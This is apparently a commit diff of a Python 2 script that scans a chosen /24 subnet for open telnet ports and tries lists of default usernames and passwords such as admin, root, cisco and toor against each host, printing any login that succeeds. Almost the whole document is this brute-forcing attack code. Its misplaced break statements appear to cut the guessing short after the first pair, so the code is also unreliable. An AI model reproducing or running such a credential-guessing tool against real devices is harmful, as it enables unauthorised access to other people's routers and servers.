97c4bef9d430fbf052bd02135e5a79d3a807670b
gstonic <gstonic@yahoo.com>
2018-06-05 06:19:35 -0700

    Update scan_telnet_port.py

--- scan_telnet_port.py
+++ scan_telnet_port.py
@@ -1,45 +1,48 @@
 import socket
 import sys, os, telnetlib
- 
-Passwordlist = ['Telnet', 'security','synet','tech','PASSWORD','cisco','Cisco','anicust','switch','','friend','admin','Admin','ascend','pass','root']
+
+Passwordlist = ['play','Telnet','admin','Admin','root']
 userlist = ['play','Telnet','telnet','root','Root','admin','Admin','','cisco','Cisco','toor']
- 
-ports = [23]
- 
+ips = raw_input("which ip would you like to start with? please type as follow - 192.168.1\n")
+
 for hosts in range(256):
-    for port in ports:
         try:
-            host = '192.168.1.' + str(hosts)
-            print "[+] Connecting to " + host + ":" + str(port)
+            host = ips + "." + str(hosts)
+            print "[+] Connecting to " + host + ":" + str(23)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-            result = s.connect_ex((host, port))
+            result = s.connect_ex((host, 23))
             if result == 0:
-                print "  [*] Port " + str(port) + " open!"
-                print "trying passwords:"
-            
-            print x
-            for a in userlist:
-                for b in Passwordlist:
-                    Host = x
-                    user = a
-                    password = b
-                    try:
-                        tn = telnetlib.Telnet(Host)
-                        tn.read_until("login: ")
-                        f = open('telnet.txt','w')
-                        f.write(Host , password)
-                        f.close()
-                        tn.write(user + "\n")
-                        tn.write("ls\n")
-                        tn.write("exit\n")
-                        print tn.read_all()
+                print "  [*] 23 "  + " open!"
+                #  trying passwords: 
+                for user in userlist:
+                    for password in Passwordlist:
+                        #print 'trying user and password ' + "\n" + user + password
+                        try:
+                            tn = telnetlib.Telnet(host)
+                            str2 = 'Last login'
+                            tn.read_until("login: ")
+                            tn.write(user + "\n")
+                            tn.read_until("Password: ")
+                            tn.write(password +"\n")
+                            pri = tn.read_until("Last login:", 2 )
+                           
+                            inter = pri.find(str2)
+                            # testing connection 
+                            if float(inter) > 0:
+                                print "****************************************\n"
+                                print "Connection was seccsesful with  " + host
+                                print "\n password = " + password
+                                print "\n user = " + user
+                                print "****************************************\n" 
+                            else :
+                                print 'the wrong password ' + password
+                        except:
+                            print '\n'
                         break
-                    except:
-                        print "connection error ip = " ,x  
-                        print "user = " ,a
-                        print "password = " ,b
-                        print "\n"
-                        s.close()
+                    break
+                        
+                            
         except:
-            pass
+            print '\n'
+            
